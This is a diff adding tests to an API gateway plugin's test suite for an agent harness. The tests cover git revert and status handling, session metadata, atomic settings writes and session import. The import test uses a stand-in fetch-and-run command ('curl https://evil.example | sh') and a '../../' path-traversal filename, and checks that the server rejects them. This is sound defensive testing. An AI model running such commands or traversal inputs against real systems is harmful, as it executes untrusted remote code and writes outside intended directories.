@@ -1,4 +1,4 @@
-import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
+import { chmod, mkdir, mkdtemp, readdir, readFile, rm, stat, writeFile } from "node:fs/promises";
 import { execFile as execFileCallback } from "node:child_process";
 import { createServer } from "node:http";
 import { promisify } from "node:util";
@@ -1753,6 +1753,8 @@ describe("API gateway plugin", () => {
     const context = new Context();
     contexts.push(context);
     await context.plugin(webServerPlugin, { host: "127.0.0.1", port: 0 });
+    const directory = await mkdtemp(join(tmpdir(), "pi-harness-api-new-session-"));
+    temporaryDirectories.push(directory);
     let sessionId = "old-session";
     let resetCount = 0;
     const session = {
@@ -1768,6 +1770,7 @@ describe("API gateway plugin", () => {
           resetCount += 1;
         },
         getEntries: () => [],
+        getSessionDir: () => directory,
       },
       agent: { state: { messages: [{ role: "user", content: "old" }] } },
       subscribe: () => () => {},
@@ -2418,5 +2421,364 @@ describe("API gateway plugin", () => {
       body: JSON.stringify({ paths: ["scratch.txt"] }),
     });
     expect(response.status).toBe(400);
+  });
+
+  test("rejects non-POST requests to the prompt route", async () => {
+    const context = new Context();
+    contexts.push(context);
+    await context.plugin(webServerPlugin, { host: "127.0.0.1", port: 0 });
+    const session = { sessionId: "method-session", sessionFile: undefined, messages: [], isStreaming: false, subscribe: () => () => {} };
+    context.provide("piRuntime", { session, prompt: () => Promise.resolve() } as never);
+    context.provide("piModels", { model: { provider: "test", id: "model" } } as never);
+    context.provide("piHarnessLaunch", { cwd: "/tmp", agentDir: "/tmp/agent", args: [], requestExit() {} });
+    await context.plugin(apiPlugin);
+
+    const response = await fetch(context.webServer.url + "/api/prompt");
+    expect(response.status).toBe(405);
+    await expect(response.json()).resolves.toEqual({ error: "Method not allowed" });
+  });
+
+  test("keeps the retained trajectory bounded and free of streaming deltas", async () => {
+    const context = new Context();
+    contexts.push(context);
+    await context.plugin(webServerPlugin, { host: "127.0.0.1", port: 0 });
+    type Listener = (event: { type: string; [key: string]: unknown }) => void;
+    const listeners = new Set<Listener>();
+    const session = {
+      sessionId: "bounded-session",
+      sessionFile: undefined,
+      messages: [],
+      isStreaming: false,
+      subscribe(listener: Listener) {
+        listeners.add(listener);
+        return () => listeners.delete(listener);
+      },
+    };
+    context.provide("piRuntime", { session, prompt: () => Promise.resolve() } as never);
+    context.provide("piModels", { model: { provider: "test", id: "model" } } as never);
+    context.provide("piHarnessLaunch", { cwd: "/tmp", agentDir: "/tmp/agent", args: [], requestExit() {} });
+    await context.plugin(apiPlugin);
+
+    const stream = await fetch(context.webServer.url + "/api/events");
+    const reader = stream.body?.getReader();
+    await reader?.read();
+    for (let index = 0; index < 2500; index += 1) {
+      listeners.forEach((listener) => listener({ type: "tool_execution_start", toolName: "read", toolCallId: `call-${index}`, args: {} }));
+    }
+    let delivered = "";
+    for (let index = 0; index < 500; index += 1) {
+      listeners.forEach((listener) =>
+        listener({ type: "message_update", assistantMessageEvent: { type: "text_delta", delta: "x" }, message: { role: "assistant", content: [] } }),
+      );
+    }
+    while (!delivered.includes('"type":"message_update"')) {
+      const chunk = await reader?.read();
+      delivered += new TextDecoder().decode(chunk?.value);
+    }
+    await reader?.cancel();
+
+    const response = await fetch(context.webServer.url + "/api/session");
+    expect(response.status).toBe(200);
+    const payload = (await response.json()) as { events: { type: string; toolCallId?: string }[] };
+    expect(payload.events).toHaveLength(2000);
+    expect(payload.events.some((event) => event.type === "message_update")).toBe(false);
+    expect(payload.events[0]?.toolCallId).toBe("call-500");
+    expect(payload.events.at(-1)?.toolCallId).toBe("call-2499");
+    const status = await fetch(context.webServer.url + "/api/status");
+    await expect(status.json()).resolves.toMatchObject({ events: 2000 });
+  });
+
+  test("reverts tracked and untracked workspace files together and rejects unknown paths", async () => {
+    const context = new Context();
+    contexts.push(context);
+    const directory = await mkdtemp(join(tmpdir(), "pi-harness-api-revert-mixed-"));
+    temporaryDirectories.push(directory);
+    await execFile("git", ["init", "-q"], { cwd: directory });
+    await execFile("git", ["config", "user.email", "pi-harness@test.invalid"], { cwd: directory });
+    await execFile("git", ["config", "user.name", "Pi Harness Test"], { cwd: directory });
+    await writeFile(join(directory, "tracked.txt"), "before\n", "utf8");
+    await writeFile(join(directory, "removed.txt"), "gone\n", "utf8");
+    await execFile("git", ["add", "tracked.txt", "removed.txt"], { cwd: directory });
+    await execFile("git", ["commit", "-qm", "initial"], { cwd: directory });
+    await writeFile(join(directory, "tracked.txt"), "after\n", "utf8");
+    await writeFile(join(directory, "scratch.txt"), "discard me\n", "utf8");
+    await execFile("git", ["rm", "-q", "removed.txt"], { cwd: directory });
+    await context.plugin(webServerPlugin, { host: "127.0.0.1", port: 0 });
+    const session = { sessionId: "revert-session", sessionFile: undefined, messages: [], isStreaming: false, subscribe: () => () => {} };
+    context.provide("piRuntime", { session, prompt: () => Promise.resolve(), abort: () => Promise.resolve(), dispose: () => Promise.resolve() } as never);
+    context.provide("piModels", { model: { provider: "test", id: "model" }, runtime: { getModels: () => [], getModel: () => undefined } } as never);
+    context.provide("piHarnessLaunch", { cwd: directory, agentDir: "/tmp/agent", args: [], requestExit() {} });
+    await context.plugin(apiPlugin);
+
+    const unknown = await fetch(context.webServer.url + "/api/files/revert", {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({ paths: ["does-not-exist.txt"], confirm: true }),
+    });
+    expect(unknown.status).toBe(409);
+    const unknownBody = (await unknown.json()) as { error: string };
+    expect(unknownBody.error).toContain("does-not-exist.txt");
+    const response = await fetch(context.webServer.url + "/api/files/revert", {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({ paths: ["tracked.txt", "scratch.txt", "removed.txt"], confirm: true }),
+    });
+    expect(response.status).toBe(200);
+    await expect(response.json()).resolves.toMatchObject({ reverted: true });
+    await expect(readFile(join(directory, "tracked.txt"), "utf8")).resolves.toBe("before\n");
+    await expect(readFile(join(directory, "removed.txt"), "utf8")).resolves.toBe("gone\n");
+    await expect(stat(join(directory, "scratch.txt"))).rejects.toMatchObject({ code: "ENOENT" });
+    await expect(execFile("git", ["status", "--porcelain"], { cwd: directory })).resolves.toMatchObject({ stdout: "" });
+  });
+
+  test("surfaces git status failures and truncation instead of reporting a clean workspace", async () => {
+    const context = new Context();
+    contexts.push(context);
+    const directory = await mkdtemp(join(tmpdir(), "pi-harness-api-git-shim-"));
+    temporaryDirectories.push(directory);
+    const shimDirectory = join(directory, "bin");
+    await mkdir(shimDirectory);
+    const shim = join(shimDirectory, "git");
+    await context.plugin(webServerPlugin, { host: "127.0.0.1", port: 0 });
+    const session = { sessionId: "files-session", sessionFile: undefined, messages: [], isStreaming: false, subscribe: () => () => {} };
+    context.provide("piRuntime", { session, prompt: () => Promise.resolve(), abort: () => Promise.resolve(), dispose: () => Promise.resolve() } as never);
+    context.provide("piModels", { model: { provider: "test", id: "model" }, runtime: { getModels: () => [], getModel: () => undefined } } as never);
+    context.provide("piHarnessLaunch", { cwd: directory, agentDir: "/tmp/agent", args: [], requestExit() {} });
+    await context.plugin(apiPlugin);
+
+    const originalPath = process.env.PATH ?? "";
+    process.env.PATH = `${shimDirectory}:${originalPath}`;
+    try {
+      await writeFile(shim, '#!/bin/sh\necho "fatal: index file corrupt" >&2\nexit 128\n', { mode: 0o755 });
+      const failed = await fetch(context.webServer.url + "/api/files");
+      expect(failed.status).toBe(500);
+      await expect(failed.json()).resolves.toEqual({ error: "fatal: index file corrupt" });
+
+      await writeFile(shim, "#!/bin/sh\nprintf ' M tracked.txt\\n'\nseq 1 40000 | sed 's/^/?? untracked-/;s/$/.txt/'\n", { mode: 0o755 });
+      const truncated = await fetch(context.webServer.url + "/api/files");
+      expect(truncated.status).toBe(200);
+      const payload = (await truncated.json()) as { items: { path: string }[]; truncated?: boolean };
+      expect(payload.truncated).toBe(true);
+      expect(payload.items[0]).toMatchObject({ path: "tracked.txt", status: "M", label: "modified" });
+      expect(payload.items.length).toBeGreaterThan(1);
+      expect(payload.items.length).toBeLessThan(40001);
+      expect(payload.items.every((item) => /^(tracked|untracked-\d+)\.txt$/.test(item.path))).toBe(true);
+    } finally {
+      process.env.PATH = originalPath;
+    }
+  });
+
+  test("reports a git process killed by the output limit as a server failure rather than a rejected commit", async () => {
+    const context = new Context();
+    contexts.push(context);
+    const directory = await mkdtemp(join(tmpdir(), "pi-harness-api-git-kill-"));
+    temporaryDirectories.push(directory);
+    const shimDirectory = join(directory, "bin");
+    await mkdir(shimDirectory);
+    await writeFile(join(shimDirectory, "git"), "#!/bin/sh\nhead -c 3145728 /dev/zero | tr '\\0' x\n", { mode: 0o755 });
+    await context.plugin(webServerPlugin, { host: "127.0.0.1", port: 0 });
+    const session = { sessionId: "commit-session", sessionFile: undefined, messages: [], isStreaming: false, subscribe: () => () => {} };
+    context.provide("piRuntime", { session, prompt: () => Promise.resolve(), abort: () => Promise.resolve(), dispose: () => Promise.resolve() } as never);
+    context.provide("piModels", { model: { provider: "test", id: "model" }, runtime: { getModels: () => [], getModel: () => undefined } } as never);
+    context.provide("piHarnessLaunch", { cwd: directory, agentDir: "/tmp/agent", args: [], requestExit() {} });
+    await context.plugin(apiPlugin);
+
+    const originalPath = process.env.PATH ?? "";
+    process.env.PATH = `${shimDirectory}:${originalPath}`;
+    try {
+      const response = await fetch(context.webServer.url + "/api/files/commit", {
+        method: "POST",
+        headers: { "content-type": "application/json" },
+        body: JSON.stringify({ paths: ["README.md"], message: "Update README" }),
+      });
+      expect(response.status).toBe(500);
+      await expect(response.json()).resolves.toEqual({ error: "git add produced more output than the buffer limit allows" });
+    } finally {
+      process.env.PATH = originalPath;
+    }
+  });
+
+  test("serializes concurrent session metadata updates so none are lost", async () => {
+    const context = new Context();
+    contexts.push(context);
+    const directory = await mkdtemp(join(tmpdir(), "pi-harness-api-metadata-"));
+    temporaryDirectories.push(directory);
+    await context.plugin(webServerPlugin, { host: "127.0.0.1", port: 0 });
+    const session = {
+      sessionId: "metadata-session",
+      sessionFile: undefined,
+      messages: [],
+      isStreaming: false,
+      sessionManager: { getSessionDir: () => directory, isPersisted: () => true, getEntries: () => [] },
+      subscribe: () => () => {},
+    };
+    context.provide("piRuntime", { session, prompt: () => Promise.resolve() } as never);
+    context.provide("piModels", { model: { provider: "test", id: "model" } } as never);
+    context.provide("piHarnessLaunch", { cwd: "/tmp", agentDir: "/tmp/agent", args: [], requestExit() {} });
+    await context.plugin(apiPlugin);
+
+    const paths = Array.from({ length: 8 }, (_, index) => join(directory, `2026-08-30T00-00-0${index}-000Z_session-${index}.jsonl`));
+    const responses = await Promise.all(
+      paths.map((path, index) =>
+        index % 2 === 0
+          ? fetch(context.webServer.url + "/api/session/metadata", {
+              method: "POST",
+              headers: { "content-type": "application/json" },
+              body: JSON.stringify({ path, pinned: true }),
+            })
+          : fetch(context.webServer.url + "/api/sessions/batch", {
+              method: "POST",
+              headers: { "content-type": "application/json" },
+              body: JSON.stringify({ action: "archive", paths: [path] }),
+            }),
+      ),
+    );
+    expect(responses.map((response) => response.status)).toEqual(Array(8).fill(200));
+    const stored = JSON.parse(await readFile(join(directory, ".pi-harness-session-meta.json"), "utf8")) as Record<
+      string,
+      { pinned?: boolean; archived?: boolean }
+    >;
+    expect(Object.keys(stored).sort()).toEqual([...paths].sort());
+    paths.forEach((path, index) => expect(stored[path]).toEqual(index % 2 === 0 ? { pinned: true } : { archived: true }));
+    const leftovers = (await readdir(directory)).filter((name) => name.endsWith(".tmp"));
+    expect(leftovers).toEqual([]);
+  });
+
+  test("quarantines corrupt session metadata instead of silently replacing it", async () => {
+    const context = new Context();
+    contexts.push(context);
+    const directory = await mkdtemp(join(tmpdir(), "pi-harness-api-metadata-corrupt-"));
+    temporaryDirectories.push(directory);
+    const metadataFile = join(directory, ".pi-harness-session-meta.json");
+    const corrupt = '{ "other.jsonl": { "arc';
+    await writeFile(metadataFile, corrupt, "utf8");
+    await context.plugin(webServerPlugin, { host: "127.0.0.1", port: 0 });
+    const session = {
+      sessionId: "metadata-session",
+      sessionFile: undefined,
+      messages: [],
+      isStreaming: false,
+      sessionManager: { getSessionDir: () => directory, isPersisted: () => true, getEntries: () => [] },
+      subscribe: () => () => {},
+    };
+    context.provide("piRuntime", { session, prompt: () => Promise.resolve() } as never);
+    context.provide("piModels", { model: { provider: "test", id: "model" } } as never);
+    context.provide("piHarnessLaunch", { cwd: "/tmp", agentDir: "/tmp/agent", args: [], requestExit() {} });
+    await context.plugin(apiPlugin);
+
+    const list = await fetch(context.webServer.url + "/api/sessions");
+    expect(list.status).toBe(200);
+    const quarantined = (await readdir(directory)).filter((name) => name.startsWith(".pi-harness-session-meta.json.corrupt-"));
+    expect(quarantined).toHaveLength(1);
+    await expect(readFile(join(directory, quarantined[0] ?? ""), "utf8")).resolves.toBe(corrupt);
+    await expect(stat(metadataFile)).rejects.toMatchObject({ code: "ENOENT" });
+
+    const path = join(directory, "2026-08-30T00-00-00-000Z_pinned.jsonl");
+    const update = await fetch(context.webServer.url + "/api/session/metadata", {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({ path, pinned: true }),
+    });
+    expect(update.status).toBe(200);
+    await expect(update.json()).resolves.toEqual({ path, metadata: { pinned: true } });
+    expect(JSON.parse(await readFile(metadataFile, "utf8"))).toEqual({ [path]: { pinned: true } });
+    await expect(readFile(join(directory, quarantined[0] ?? ""), "utf8")).resolves.toBe(corrupt);
+  });
+
+  test("replaces settings.json atomically through the config source route", async () => {
+    const context = new Context();
+    contexts.push(context);
+    const agentDir = await mkdtemp(join(tmpdir(), "pi-harness-api-agent-"));
+    temporaryDirectories.push(agentDir);
+    const settingsPath = join(agentDir, "settings.json");
+    await writeFile(settingsPath, '{"stale":true}\n', "utf8");
+    await chmod(settingsPath, 0o444);
+    await context.plugin(webServerPlugin, { host: "127.0.0.1", port: 0 });
+    const settingsManager = new Proxy({}, { get: () => () => ({}) });
+    const session = { sessionId: "config-session", sessionFile: undefined, messages: [], isStreaming: false, settingsManager, subscribe: () => () => {} };
+    context.provide("piRuntime", { session, prompt: () => Promise.resolve() } as never);
+    context.provide("piModels", { model: { provider: "test", id: "model" } } as never);
+    context.provide("piHarnessLaunch", { cwd: "/tmp", agentDir, args: [], requestExit() {} });
+    await context.plugin(apiPlugin);
+
+    const response = await fetch(context.webServer.url + "/api/config/source", {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({ source: '{"defaultProvider":"test","defaultModel":"model"}' }),
+    });
+    expect(response.status).toBe(200);
+    await expect(readFile(settingsPath, "utf8")).resolves.toBe('{\n  "defaultProvider": "test",\n  "defaultModel": "model"\n}\n');
+    expect((await stat(settingsPath)).mode & 0o777).toBe(0o444);
+    expect((await readdir(agentDir)).filter((name) => name.endsWith(".tmp"))).toEqual([]);
+  });
+
+  test("imports session content through a private temporary file and never writes to a caller-supplied path", async () => {
+    const context = new Context();
+    contexts.push(context);
+    const directory = await mkdtemp(join(tmpdir(), "pi-harness-api-import-"));
+    temporaryDirectories.push(directory);
+    const sourceDir = join(directory, "source");
+    const targetDir = join(directory, "target");
+    await mkdir(sourceDir);
+    await mkdir(targetDir);
+    const source = SessionManager.create("/tmp", sourceDir);
+    source.appendMessage({ role: "user", content: "x".repeat(100 * 1024), timestamp: Date.now() });
+    source.appendMessage({
+      role: "assistant",
+      content: [{ type: "text", text: "saved" }],
+      api: "test",
+      provider: "test",
+      model: "model",
+      usage: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0, totalTokens: 0, cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0, total: 0 } },
+      stopReason: "stop",
+      timestamp: Date.now(),
+    } as never);
+    const content = await readFile(source.getSessionFile() ?? "", "utf8");
+    expect(Buffer.byteLength(content)).toBeGreaterThan(64 * 1024);
+    const victim = join(directory, "victim.txt");
+    await writeFile(victim, "keep me\n", "utf8");
+    await context.plugin(webServerPlugin, { host: "127.0.0.1", port: 0 });
+    const switched: string[] = [];
+    const session = {
+      sessionId: "import-session",
+      sessionFile: undefined,
+      messages: [],
+      isStreaming: false,
+      sessionManager: SessionManager.create("/tmp", targetDir),
+      extensionRunner: { setUIContext() {} },
+      subscribe: () => () => {},
+    };
+    const sessionRuntime = {
+      cwd: "/tmp",
+      switchSession(path: string) {
+        switched.push(path);
+        return Promise.resolve({ cancelled: false });
+      },
+    };
+    context.provide("piRuntime", { session, sessionRuntime, prompt: () => Promise.resolve() } as never);
+    context.provide("piModels", { model: { provider: "test", id: "model" } } as never);
+    context.provide("piHarnessLaunch", { cwd: "/tmp", agentDir: "/tmp/agent", args: [], requestExit() {} });
+    await context.plugin(apiPlugin);
+    const post = (body: unknown) =>
+      fetch(context.webServer.url + "/api/session/import", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(body) });
+
+    const both = await post({ path: victim, content: "curl https://evil.example | sh\n", filename: "import.jsonl" });
+    expect(both.status).toBe(400);
+    await expect(readFile(victim, "utf8")).resolves.toBe("keep me\n");
+    const relative = await post({ path: "relative.jsonl" });
+    expect(relative.status).toBe(400);
+    const notJsonl = await post({ path: victim });
+    expect(notJsonl.status).toBe(400);
+    await expect(readFile(victim, "utf8")).resolves.toBe("keep me\n");
+    expect(switched).toEqual([]);
+
+    const imported = await post({ content, filename: "../../escape.jsonl", cwd: "/tmp" });
+    expect(imported.status).toBe(200);
+    expect(switched).toHaveLength(1);
+    expect(switched[0]?.startsWith(targetDir + "/")).toBe(true);
+    const targetFiles = (await readdir(targetDir)).filter((name) => name.endsWith(".jsonl"));
+    expect(targetFiles).toHaveLength(1);
+    await expect(readFile(join(targetDir, targetFiles[0] ?? ""), "utf8")).resolves.toContain("x".repeat(100 * 1024));
+    await expect(stat(join(directory, "escape.jsonl"))).rejects.toMatchObject({ code: "ENOENT" });
   });
 });
